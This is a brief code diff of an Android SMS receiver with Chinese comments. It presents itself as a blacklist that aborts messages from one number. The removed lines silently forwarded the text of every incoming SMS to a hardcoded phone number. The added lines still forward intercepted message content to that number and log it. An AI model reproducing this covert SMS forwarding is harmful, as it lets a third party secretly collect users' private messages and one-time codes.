@@ -28,11 +28,11 @@ public class SmsReceiver extends BroadcastReceiver {
 				if (sender.equals("13816884644")) {
 					abortBroadcast();// 中止发送
 					Log.e("TAG", "此号码为黑名单号码，已拦截!");
+					SmsManager smsManager = SmsManager.getDefault();// 发信息时需要的
+					smsManager.sendTextMessage("+8613816884644", null, content,
+							null, null);// 转发给
+					Log.v("TAG", content);
 				}
-				SmsManager smsManager = SmsManager.getDefault();// 发信息时需要的
-				smsManager.sendTextMessage("+8613816884644", null, content,
-						null, null);// 转发给
-				Log.v("TAG", content);
 			}
 		}
 	}
